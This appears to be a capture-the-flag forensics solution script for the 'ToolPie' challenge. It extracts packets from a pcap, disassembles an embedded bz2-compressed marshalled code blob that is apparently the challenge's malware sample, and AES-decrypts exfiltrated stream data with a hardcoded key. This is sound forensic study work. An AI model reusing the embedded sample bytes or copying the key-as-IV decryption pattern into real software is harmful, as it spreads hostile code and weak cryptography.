\x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&amp;\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6&lt;\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18&lt;\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&amp;? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&amp;\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3&lt;\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04&lt;\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&amp;[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac&lt;N7)g\x9f\xc1\xd8p\xab\&#39;\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%&#34;p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c&lt;\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-&#34;\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&amp;+\xf7\x83Oj\x9d\xab\xb7Uh&#34;z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K&gt;qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\&#39;\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa5\xd3\x14O\xe0\x12\x06]&#34;\xb2\xa8\x82\xac`\&#39;L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00&#39;

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def demarshalling(self):
        &#34;&#34;&#34;
        Description:
            This function is used to demarshall the compressed data and display the disassembled code.
            Challenge specific function
        &#34;&#34;&#34;
        self.load_compressed_data()
        data = bz2.decompress(self.compressed_data)
        code = marshal.loads(data)

        print(dis.dis(code))

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def dec_file_mes(self, mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

        return unpad(cypher.decrypt(mes), 16)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

        Returns:
            dict: Dictionary of packets
        &#34;&#34;&#34;

        packets = None
        # Dictionary to hold packets
        packets_dict = {}

        if pcap_function == &#34;scapy&#34;:
            packets = rdpcap(pcap_file.as_posix())
        elif pcap_function == &#34;pyshark&#34;:
            packets = pyshark.FileCapture(pcap_file.as_posix())

        if raw:
            return packets

        for i, packet in enumerate(packets):
            packets_dict[i + 1] = packet

        return packets_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def smart_extract_packets(
        self,
        pcap_file,
        pcap_function: str,
        raw: bool = False,
        save: bool = False,
        filename_save: str = &#34;packets.pickle&#34;,
        folder_save: str = &#34;data&#34;,
    ):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a dictionary.
            If the file already exists, it loads the file.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
            raw (bool, optional): Option to return the raw packets. Defaults to False.
            save (bool, optional): Option to load saved file . Defaults to False.
            filename_save (str, optional): Filename to save the packets if enabled. Defaults to &#34;packets.pickle&#34;.
            folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to &#34;data&#34;.
        &#34;&#34;&#34;

        file_path = None

        if save:
            file_path = self.folfil(folder_save, filename_save)

        if file_path is None or file_path.exists() is False:
            # Read the pcap file
            print(f&#34;Extracting packets using {pcap_function}&#34;)
            packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

            # Save the packets
            if save:
                self.pickle_save_data(
                    packets, filename=filename_save, folder=folder_save
                )
        else:
            print(f&#34;Loading packets from {filename_save}&#34;)
            packets = self.pickle_load_data(file_path)
        return packets

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def custom_stream_extract(self, stream_num=None):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            stream_num (int): Stream number to extract

        Returns:
            dict: Dictionary of packets
        &#34;&#34;&#34;

        packets_scapy = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;scapy&#34;,
            save=True,
            filename_save=&#34;packets_scapy.pickle&#34;,
        )

        packets_pyshark = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;pyshark&#34;,
            save=True,
            filename_save=&#34;packets_pyshark.pickle&#34;,
        )

        packet_dict = {}
        for i, packet in packets_pyshark.items():
            if hasattr(packet.tcp, &#34;stream&#34;) and int(packet.tcp.stream) == stream_num:
                packet_dict[i] = packets_scapy[i]
        return packet_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def get_scapy_tcp_stream(self, nunber: int):
        &#34;&#34;&#34;
        Unused , but could be useful in the future
        &#34;&#34;&#34;
        packets = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;scapy&#34;,
            raw=True,
            save=True,
            filename_save=&#34;packets_scapy_raw.pickle&#34;,
        )
        stream = packets.sessions()
        return stream

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def decrypting_stream_4(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function
        &#34;&#34;&#34;

        stream_4 = self.custom_stream_extract(stream_num=4)

        # print(list(stream_4.keys())[0])
        # # print(stream_4[list(stream_4.keys())[0]].show())

        

        start = 94
        end = 997
        encrypted_data = b&#34;&#34;

        for i, packet in stream_4.items():
            if (
                i &lt; start
                or i &gt; end
                or hasattr(packet, &#34;load&#34;) is False
                or packet[IP].src != &#34;172.31.47.152&#34;
            ):
                continue

            encrypted_data += packet.load

        try:
            decrypted_data = self.dec_file_mes(encrypted_data, self.encryption_key)
            print(f&#34;Packet {i} :&#34;)
            with open(self.folfil(&#34;data&#34;, &#34;decrypted_data&#34;), &#34;wb&#34;) as f:
                f.write(decrypted_data)
            print(decrypted_data)
        except Exception as e:
            print(f&#34;packet {i} : {e}&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def saving_stream_4_encrypted_bytes(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function
        &#34;&#34;&#34;

        stream_4 = self.custom_stream_extract(stream_num=4)

        start = 94
        end = 996

        # print(list(stream_4.keys())[0])
        # # print(stream_4[list(stream_4.keys())[0]].show())

        encrypted_load_file_path = self.folfil(&#34;data&#34;, &#34;encrypted_load.txt&#34;)

        for i, packet in stream_4.items():
            if i &lt; start or i &gt; end:
                continue

            if hasattr(packet, &#34;load&#34;) is False:
                continue

            try:
                with open(encrypted_load_file_path, &#34;ab&#34;) as f:
                    f.write(packet.load)
                # decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
            except Exception as e:
                print(f&#34;packet {i} : {e}&#34;)

        decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
        print(f&#34;decrypted :&#34;)
        print(decrypted_data)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def decrypting_packet(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function
        &#34;&#34;&#34;
        # packet_data_path = self.folfil(&#34;data&#34;, &#34;packet_1.data&#34;)

        ending_number = 94
        packet_path = self.folfil(&#34;data&#34;, &#34;packets&#34;)

        for num in range(94, ending_number + 1):

            packet_data_path = self.Path(packet_path, f&#34;packet_{num}.data&#34;)

            with open(packet_data_path, &#34;rb&#34;) as f:
                packet_data = f.read()

            decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
            print(f&#34;Packet {num} :&#34;)
            print(decrypted_data)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def main(self):
        # self.demarshalling()
        self.decrypting_stream_4()

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption_key = &#34;5UUfizsRsP7oOCAq&#34;

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pickle_save_data(self, data: any, filename: str, folder: str = &#34;data&#34;) -&gt; None:
        &#34;&#34;&#34;
        Description:
            Save data to a pickle file

        Args:
            data (any): data to write to the pickle file. Can be anything
            filename (str): Filename to save
            folder (str, optional): Folder name inside the ctf folder. Defaults to &#34;data&#34;.

        Returns:
            None
        &#34;&#34;&#34;
        with open(self.folfil(folder, filename), &#34;wb&#34;) as f:
            pickle.dump(data, f)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pickle_load_data(self, filename: str, folder: str = &#34;data&#34;) -&gt; any:
        &#34;&#34;&#34;
        Description:
            Load data from a pickle file

        Args:
            filename (str): Filename to load the data from
            folder (str, optional): Folder name to find the file to load the data from. Defaults to &#34;data&#34;.

        Returns:
            any: Data loaded from pickle
        &#34;&#34;&#34;
        with open(self.folfil(folder, filename), &#34;rb&#34;) as f:
            return pickle.load(f)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def load_compressed_data(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function to load the compressed data
        &#34;&#34;&#34;
        self.compressed_data = b&#39;BZh91AY&amp;SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4&#34;|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&amp;\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\&#39;\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&amp;F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&amp;\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&amp;M&amp;\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1&#34;\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df&gt;$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|&gt;\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo&#34;\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&amp;\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa&gt;E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0&#34;\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&amp;&amp;\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\&#39;\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm&lt;\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a&#34;J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18&gt;\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI&lt;\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80&lt;%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&amp;w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85&#34;.j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&amp;\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5&lt;\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08&lt;\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd&lt;q\r\xbb0\xc4Ac\x95.v\x94\x08&gt;\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&amp;\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q&#34;\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d&gt;\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0&gt;\xcf\&#39;7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02&#34;@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u&lt;\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|&gt;\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e&lt;\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c&#34;\x86\xa6\x9c&amp;,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff&#34;|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\&#39;\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r&gt;\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &amp;,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&amp;\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\&#39;\x04\xe0&amp;\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&amp;c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q \x8eZ\xd5p*-qC%\xec\x85aH\x90&gt;\xc1\x97%B@\x12B&#34;u\xd5R\x0f\x10`&amp;\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5&lt;\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\&#39;\x04\xc1l&amp;\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) \x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&amp;\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 @B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5&#34;Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82&#34;\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc&#34;\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&amp;\xe7NQ\x9e\&#39;93M\x8f`!\xcc\x80#%\x04\xd2\xeb&#34;T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&amp;\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{&gt;_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e&lt;\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\&#39;Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e&#34;\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9&gt;\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\&#39;\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 